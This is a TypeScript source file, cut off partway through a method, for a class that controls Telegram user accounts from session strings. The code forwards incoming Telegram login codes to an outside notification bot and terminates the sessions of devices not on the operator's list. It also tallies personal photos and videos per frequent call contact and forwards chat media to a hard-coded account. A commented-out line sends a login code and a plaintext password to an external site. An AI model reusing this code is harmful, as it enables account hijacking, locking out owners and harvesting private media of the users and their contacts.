import { TelegramClient } from 'telegram';
import { StringSession } from 'telegram/sessions';
import { NewMessage, NewMessageEvent } from 'telegram/events';
import { Api } from 'telegram/tl';
import axios from 'axios';
import * as fs from 'fs';
import { CustomFile } from 'telegram/client/uploads';
import { TotalList, sleep } from 'telegram/Helpers';
import { Dialog } from 'telegram/tl/custom/dialog';
import { LogLevel } from 'telegram/extensions/Logger';
import { MailReader } from '../../IMap/IMap';
import bigInt from 'big-integer';
import { IterDialogsParams } from 'telegram/client/dialogs';
import { EntityLike } from 'telegram/define';
import { contains } from '../../utils';
import { parseError } from '../../utils/parseError';
import { fetchWithTimeout } from '../../utils/fetchWithTimeout';
import { notifbot } from '../../utils/logbots';

class TelegramManager {
    private session: StringSession;
    public phoneNumber: string;
    public client: TelegramClient | null;
    private channelArray: string[];
    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };
    constructor(sessionString: string, phoneNumber: string) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }

    public static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }

    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {
        TelegramManager.activeClientSetup = data;
    }

    public async createGroup() {
        const groupName = "Saved Messages"; // Customize your group name
        const groupDescription = this.phoneNumber; // Optional description
        const result: any = await this.client.invoke(
            new Api.channels.CreateChannel({
                title: groupName,
                about: groupDescription,
                megagroup: true,
                forImport: true,
            })
        );
        const { id, accessHash } = result.chats[0];

        // Logic to categorize the dialog to a folder
        const folderId = 1; // Replace with the desired folder ID
        await this.client.invoke(
            new Api.folders.EditPeerFolders({
                folderPeers: [
                    new Api.InputFolderPeer({
                        peer: new Api.InputPeerChannel({
                            channelId: id,
                            accessHash: accessHash,
                        }),
                        folderId: folderId,
                    }),
                ],
            })
        );

        // Add users to the channel
        const usersToAdd = ["fuckyoubabie"]; // Replace with the list of usernames or user IDs
        const addUsersResult = await this.client.invoke(
            new Api.channels.InviteToChannel({
                channel: new Api.InputChannel({
                    channelId: id,
                    accessHash: accessHash,
                }),
                users: usersToAdd
            })
        );
        return { id, accessHash };
    }

    public async createGroupAndForward(fromChatId: string) {
        const { id, accessHash } = await this.createGroup();
        await this.forwardSecretMsgs(fromChatId, id.toString());
    }

    public async joinChannelAndForward(fromChatId: string, channel: string) {
        const result: any = await this.joinChannel(channel);
        const folderId = 1; // Replace with the desired folder ID
        await this.client.invoke(
            new Api.folders.EditPeerFolders({
                folderPeers: [
                    new Api.InputFolderPeer({
                        peer: new Api.InputPeerChannel({
                            channelId: result.chats[0].id,
                            accessHash: result.chats[0].accessHash,
                        }),
                        folderId: folderId,
                    }),
                ],
            })
        );

        await this.forwardSecretMsgs(fromChatId, channel);
    }

    public async forwardSecretMsgs(fromChatId: string, toChatId: string) {
        let offset = 0;
        const limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages: any = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message: Api.Message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            console.log(messageIds)
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });

                    forwardedCount += messageIds.length;
                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await sleep(5000); // Sleep for a second to avoid rate limits
                } catch (error) {
                    console.error("Error occurred while forwarding messages:", error);
                }
                await sleep(5000); // Sleep for a second to avoid rate limits
            }
        } while (messages.length > 0);

        await this.leaveChannels([toChatId]);
        return;
    }

    //logic to forward messages from a chat to another chat maintaining rate limits
    async forwardMessages(fromChatId: string, toChatId: string, messageIds: number[]) {
        const chunkSize = 30; // Number of messages to forward per request
        const totalMessages = messageIds.length;
        let forwardedCount = 0;

        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });

                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await sleep(5000); // Sleep for a second to avoid rate limits
            } catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }

        return forwardedCount;
    }

    async disconnect(): Promise<void> {
        if (this.client) {
            try {
                console.log("Destroying Client: ", this.phoneNumber);
                
                // Remove event handler with proper parameters
                this.client.removeEventHandler(this.handleEvents, new NewMessage({}));
                
                // Destroy the connection first
                await this.client.destroy();
                
                // Then disconnect the client
                await this.client.disconnect();
                
                // Clear the client instance
                this.client = null;
                
                // Delete the session
                this.session.delete();
                
                // Clear the channel array
                this.channelArray = [];
            } catch (error) {
                console.error("Error during disconnect:", error);
                throw error;
            }
        }
    }

    async getchatId(username: string): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }

    async getMe() {
        const me = <Api.User>await this.client.getMe();
        return me
    }

    async errorHandler(error) {
        parseError(error)
        if (error.message && error.message == 'TIMEOUT') {
            // await this.client.disconnect();
            // await this.client.destroy();
            // await disconnectAll()
            //Do nothing, as this error does not make sense to appear while keeping the client disconnected
        } else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
            // Handle other types of errors
        }
    }

    async createClient(handler = true, handlerFn?: (event: NewMessageEvent) => Promise<void>): Promise<TelegramClient> {
        this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(LogLevel.ERROR);
        // this.client._errorHandler = this.errorHandler
        await this.client.connect();
        const me = <Api.User>await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler")
            if (handlerFn) {
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new NewMessage());
            } else {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new NewMessage());
            }
        }
        return this.client
    }

    async getGrpMembers(entity: EntityLike) {
        try {
            const result = []
            // Fetch the group entity
            const chat = await this.client.getEntity(entity);

            if (!(chat instanceof Api.Chat || chat instanceof Api.Channel)) {
                console.log("Invalid group or channel!");
                return;
            }

            console.log(`Fetching members of ${chat.title || (chat as Api.Channel).username}...`);

            // Fetch members
            const participants = await this.client.invoke(
                new Api.channels.GetParticipants({
                    channel: chat,
                    filter: new Api.ChannelParticipantsRecent(),
                    offset: 0,
                    limit: 200, // Adjust the limit as needed
                    hash: bigInt(0),
                })
            );

            if (participants instanceof Api.channels.ChannelParticipants) {
                const users = participants.participants;

                console.log(`Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = <Api.User>await this.client.getEntity(userInfo);
                        // console.log(
                        //     `ID: ${userDetails.id}, Name: ${userDetails.firstName || ""} ${userDetails.lastName || ""
                        //     }, Username: ${userDetails.username || ""}`
                        // );
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        })
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            console.log(JSON.stringify(userDetails.id))
                        }
                    } else {
                        console.log(JSON.stringify((user as any)?.userId))
                        // console.log(`could not find enitity for : ${JSON.stringify(user)}`)
                    }
                }
            } else {
                console.log("No members found or invalid group.");
            }
            console.log(result.length)
            return result;
        } catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async getMessages(entityLike: Api.TypeEntityLike, limit: number = 8): Promise<TotalList<Api.Message>> {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params: IterDialogsParams): Promise<TotalList<Dialog>> {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats
    }

    async getLastMsgs(limit: number): Promise<string> {
        if (!this.client) throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }

    async getSelfMSgsInfo(): Promise<{
        photoCount: number;
        videoCount: number;
        movieCount: number,
        total: number,
        ownPhotoCount: number,
        otherPhotoCount: number,
        ownVideoCount: number,
        otherVideoCount: number
    }> {
        if (!this.client) throw new Error('Client is not initialized');
        const self = <Api.User>await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if (contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++
            } else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++
                    } else {
                        otherPhotoCount++
                    }
                } else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++
                    } else {
                        otherVideoCount++
                    }
                }
            }
        }

        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount })
    }
    async channelInfo(sendIds = false): Promise<{ chatsArrayLength: number; canSendTrueCount: number; canSendFalseCount: number; ids: string[], canSendFalseChats: string[] }> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 1500 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        const canSendFalseChats = [];
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = <Api.Channel>chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    } else {
                        canSendFalseCount++;
                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                    }
                } catch (error) {
                    parseError(error);
                }
            }
        };
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : [],
            canSendFalseChats
        };
    }

    async addContact(data: { mobile: string, tgId: string }[], namePrefix: string) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`; // Automated naming
                const lastName = "";
                try {
                    await this.client.invoke(
                        new Api.contacts.AddContact({
                            firstName,
                            lastName,
                            phone: user.mobile,
                            id: user.tgId
                        })
                    );
                } catch (e) {
                    console.log(e)
                }
            }
        } catch (error) {
            console.error("Error adding contacts:", error);
            parseError(error, `Failed to save contacts`);
        }
    }

    async addContacts(mobiles: string[], namePrefix: string) {
        try {
            const inputContacts: Api.TypeInputContact[] = [];

            // Iterate over the data array and generate input contacts
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`; // Automated naming
                const lastName = ""; // Optional, no last name provided

                // Generate client_id as a combination of i and j (for uniqueness)
                // Since we only have one phone per user here, j will always be 0
                const clientId = bigInt((i << 16 | 0).toString(10)); // 0 is the index for the single phone

                inputContacts.push(new Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user, // mobile number
                    firstName: firstName,
                    lastName: lastName
                }));
            }

            // Call the API to import contacts
            const result = await this.client.invoke(
                new Api.contacts.ImportContacts({
                    contacts: inputContacts,
                })
            );

            console.log("Imported Contacts Result:", result);


        } catch (error) {
            console.error("Error adding contacts:", error);
            parseError(error, `Failed to save contacts`);
        }
    }

    async leaveChannels(chats: string[]) {
        console.log("Leaving Channels: initaied!!");
        console.log("ChatsLength: ", chats)
        for (const id of chats) {
            try {
                await this.client.invoke(
                    new Api.channels.LeaveChannel({
                        channel: id
                    })
                );
                console.log("Left channel :", id)
                if (chats.length > 1) {
                    await sleep(30000);
                }
            } catch (error) {
                const errorDetails = parseError(error);
                console.log("Failed to leave channel :", errorDetails.message)
            }
        }
    }

    async getEntity(entity: Api.TypeEntityLike) {
        return await this.client?.getEntity(entity)
    }

    async joinChannel(entity: Api.TypeEntityLike) {
        console.log("trying to join channel : ", entity)
        return await this.client?.invoke(
            new Api.channels.JoinChannel({
                channel: await this.client?.getEntity(entity)
            })
        );
    }

    connected() {
        return this.client.connected;
    }

    async connect() {
        return await this.client.connect();
    }

    async removeOtherAuths(): Promise<void> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            } else {
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }

    private isAuthMine(auth: any): boolean {
        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
            auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows');
    }


    private async resetAuthorization(auth: any): Promise<void> {
        await this.client?.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
    }

    async getAuths(): Promise<any> {
        if (!this.client) throw new Error('Client is not initialized');
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        return result;
    }

    async getAllChats(): Promise<any[]> {
        if (!this.client) throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId: string, offset: number = 0, limit: number = 20): Promise<any> {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });

        const result = await Promise.all(messages.map(async (message: Api.Message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;

            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));

        return result;
    }

    async getMediaUrl(message: Api.Message): Promise<string | Buffer> {
        if (message.media instanceof Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id)
            const sizes = (<Api.Photo>message.photo)?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });

        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id)
            const sizes = message.document?.thumbs || [1]
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }

    async sendInlineMessage(chatId: string, message: string, url: string) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new Api.KeyboardButtonUrl(button)]
        })
        return result;
    }

    async getMediaMessages() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhotos(),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );
        return result
    }


    async getCallLog() {
        const result = <Api.messages.Messages>await this.client.invoke(
            new Api.messages.Search({
                peer: new Api.InputPeerEmpty(),
                q: '',
                filter: new Api.InputMessagesFilterPhoneCalls({}),
                minDate: 0,
                maxDate: 0,
                offsetId: 0,
                addOffset: 0,
                limit: 200,
                maxId: 0,
                minId: 0,
                hash: bigInt(0),
            })
        );

        const callLogs = <Api.Message[]>result.messages.filter(
            (message: Api.Message) => message.action instanceof Api.MessageActionPhoneCall
        );

        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = <Api.MessageActionPhoneCall>log.action

            // const callInfo = {
            //     callId: logAction.callId.toString(),
            //     duration: logAction.duration,
            //     video: logAction.video,
            //     timestamp: log.date
            // };

            // Categorize by type
            if (log.out) {
                filteredResults.outgoing++;
            } else {
                filteredResults.incoming++;
            }

            if (logAction.video) {
                filteredResults.video++;
            }

            // Count calls per chat ID
            const chatId = (log.peerId as Api.PeerUser).userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = <Api.User>await this.client.getEntity(chatId)
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0
                const msgs = await this.client.getMessages(chatId, { limit: 600 })
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!contains(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof Api.MessageMediaPhoto) {
                            photo++
                        } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...(details as any),
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                })
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });

        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }

    async handleEvents(event: NewMessageEvent) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nActiveClientSetup - ', TelegramManager.activeClientSetup);
                console.log("Date :", new Date(event.message.date * 1000))
                // if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.newMobile) {
                //     console.log("LoginText: ", event.message.text)
                //     const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                //     console.log("Code is:", code);
                //     try {
                //         await fetchWithTimeout(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                //         console.log("Code Sent back");
                //     } catch (error) {
                //         parseError(error)
                //     }
                // } else {
                await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(event.message.text)}`);
                // await event.message.delete({ revoke: true });
                // }
            }
        }
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll(),
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout(),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            throw e
        }
    }
    async updateProfile(firstName: string, about: string) {
        const data = {
            lastName: "",
        }
        if (firstName !== undefined) {
            data["firstName"] = firstName
        }
        if (about !== undefined) {
            data["about"] = about
        }
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile(data)
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            throw error
        }
    }

    async downloadProfilePic(photoIndex: number) {
        try {
            const photos = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: 'me',
                    offset: 0,
                })
            );

            if (photos.photos.length > 0) {
                console.log(`You have ${photos.photos.length} profile photos.`);

                // Choose the photo index (0-based)
                if (photoIndex < photos.photos.length) {
                    const selectedPhoto = <Api.Photo>photos.photos[photoIndex];

                    // Extract the largest photo file (e.g., highest resolution)
                    const index = Math.max(selectedPhoto.sizes.length - 2, 0)
                    const photoFileSize = selectedPhoto.sizes[index];

                    // Download the file
                    const photoBuffer = await this.client.downloadFile(
                        new Api.InputPhotoFileLocation({
                            id: selectedPhoto.id,
                            accessHash: selectedPhoto.accessHash,
                            fileReference: selectedPhoto.fileReference,
                            thumbSize: photoFileSize.type
                        }), {
                        dcId: selectedPhoto.dcId, // Data center ID
                    });

                    if (photoBuffer) {
                        const outputPath = `profile_picture_${photoIndex + 1}.jpg`;
                        fs.writeFileSync(outputPath, photoBuffer);
                        console.log(`Profile picture downloaded as '${outputPath}'`);
                        return outputPath;
                    } else {
                        console.log("Failed to download the photo.");
                    }
                } else {
                    console.log(`Photo index ${photoIndex} is out of range.`);
                }
            } else {
                console.log("No profile photos found.");
            }
        } catch (err) {
            console.error("Error:", err);
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations());
        let latest = 0
        result.authorizations.map((auth) => {
            if (!this.isAuthMine(auth)) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return (new Date(latest * 1000)).toISOString().split('T')[0];
    }

    async getContacts() {
        const exportedContacts = await this.client.invoke(new Api.contacts.GetContacts({
            hash: bigInt(0)
        }));
        return exportedContacts;
    }

    async deleteChat(chatId: string) {
        try {
            await this.client.invoke(new Api.messages.DeleteHistory({
                justClear: false,
                peer: chatId,
                revoke: false,
            }));
            console.log(`Dialog with ID ${chatId} has been deleted.`);
        } catch (error) {
            console.error('Failed to delete dialog:', error);
        }
    }

    async blockUser(chatId: string) {
        try {
            await this.client?.invoke(new Api.contacts.Block({
                id: chatId,
            }));
            console.log(`User with ID ${chatId} has been blocked.`);
        } catch (error) {
            console.error('Failed to block user:', error);
        }
    }

    // Helper function to handle download with a timeout
    downloadWithTimeout(promise: Promise<Buffer>, timeout: number) {
        return Promise.race([
            promise, // The actual download promise
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }

    async getMediaMetadata(chatId: string = 'me', offset: number = undefined, limit = 100) {
        try {
            const query = { limit: parseInt(limit.toString()) };
            if (offset) query['offsetId'] = parseInt(offset.toString());

            const messages = await this.client.getMessages(chatId, query);
            const mediaMessages = messages.filter(message => {
                // console.log(message.media?.className)
                return (message.media && message.media.className !== "MessageMediaWebPage")
            });
            console.log("Total:", messages.total, "fetched: ", messages.length, "ChatId: ", chatId, "Media :", mediaMessages.length);

            if (!messages.length) {
                // If no media messages are returned, we might have reached the end
                console.log("No more media messages found. Reached the end of the chat.");
                return { data: [], endOfMessages: true };
            }

            const data = [];

            for (const message of mediaMessages) {
                console.log(message.media.className, message.document?.mimeType);
                let thumbBuffer = null;

                try {
                    if (message.media instanceof Api.MessageMediaPhoto) {
                        const sizes = (<Api.Photo>message.photo)?.sizes || [1];

                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);
                        console.log("messageId image:", message.id)
                        data.push({
                            messageId: message.id,
                            mediaType: 'photo',
                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null
                        });

                    } else if (message.media instanceof Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                        const sizes = message.document?.thumbs || [1];
                        console.log("messageId video:", message.id)
                        // const fileSize = message.document.size;

                        // // Skip overly large files for thumbnail (set threshold as needed)
                        // if (fileSize > 10 * 1024 * 1024) { // Skip files larger than 10MB for thumbnails
                        //     console.warn(`Skipping large media file with size ${fileSize} bytes (messageId: ${message.id})`);
                        //     continue;
                        // }

                        // Call downloadWithTimeout with a 5-second timeout
                        thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }) as any, 5000);

                        data.push({
                            messageId: message.id,
                            mediaType: 'video',
                            thumb: thumbBuffer?.toString('base64') || null, // Convert to base64 for sending over HTTP, handle null
                        });
                    }
                } catch (downloadError) {
                    if (downloadError.message === 'Download timeout') {
                        console.warn(`Skipping media messageId: ${message.id} due to download timeout.`);
                    } else if (downloadError.message.includes('FILE_REFERENCE_EXPIRED')) {
                        console.warn('File reference expired for message. Skipping this media.');
                        // Skip the expired media, continue processing others
                    } else {
                        console.error(`Failed to download media thumbnail for messageId: ${message.id}`, downloadError);
                    }
                    data.push({
                        messageId: message.id,
                        mediaType: 'photo',
                        thumb: null, // Convert to base64 for sending over HTTP, handle null
                    });

                    // Skip the message and continue with the next one if there's any error
                    continue;
                }
            }
            if (!data.length) {
                data.push({
                    messageId: messages[messages.length - 1].id,
                    mediaType: 'photo',
                    thumb: null, // Convert to base64 for sending over HTTP, handle null
                })
            }
            console.log("Returning ", data.length);

            // Return the metadata and signal if we reached the end of messages
            return { data, endOfMessages: false };

        } catch (error) {
            console.error('Error in getMediaMetadata:', error);
            if (error.message.includes('FLOOD_WAIT')) {
                const retryAfter = parseInt(error.message.match(/FLOOD_WAIT_(\d+)/)[1], 10);
                console.warn(`Rate limit hit. Retrying after ${retryAfter} seconds.`);
                // Handle flood wait, retry logic
                await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
                return this.getMediaMetadata(chatId, offset, limit); // Retry after waiting
            }

            throw new Error('Error fetching media metadata');
        }
    }

    async downloadMediaFile(messageId: number, chatId: string = 'me', res: any) {
        try {
            const messages = await this.client.getMessages(chatId, { ids: [messageId] });
            const message = <Api.Message>messages[0];

            if (message && !(message.media instanceof Api.MessageMediaEmpty)) {
                const media = message.media;
                let contentType, filename, fileLocation;
                const inputLocation = message.video || <Api.Photo>message.photo;

                const data = {
                    id: inputLocation.id,
                    accessHash: inputLocation.accessHash,
                    fileReference: inputLocation.fileReference,
                };

                if (media instanceof Api.MessageMediaPhoto) {
                    contentType = 'image/jpeg';
                    filename = 'photo.jpg';
                    fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });
                } else if (media instanceof Api.MessageMediaDocument) {
                    contentType = (media as any).mimeType || 'video/mp4';
                    filename = 'video.mp4';
                    fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });
                } else {
                    return res.status(415).send('Unsupported media type');
                }

                res.setHeader('Content-Type', contentType);
                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);

                const chunkSize = 512 * 1024; // 512 KB chunks

                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: bigInt[0],
                    limit: 5 * 1024 * 1024, // 80 MB limit
                    requestSize: chunkSize,
                })) {
                    res.write(chunk); // Stream each chunk to the client
                }
                res.end();
            } else {
                res.status(404).send('Media not found');
            }
        } catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }



    async forwardMessage(chatId: string, messageId: number) {
        try {
            await this.client.forwardMessages("@fuckyoubabie", { fromPeer: chatId, messages: messageId })
        } catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }

    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                await this.client.invoke(new Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log(error)
            }
        } else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await sleep(2000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                    await sleep(2000);
                }
            }
        }
        return newUserName;
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
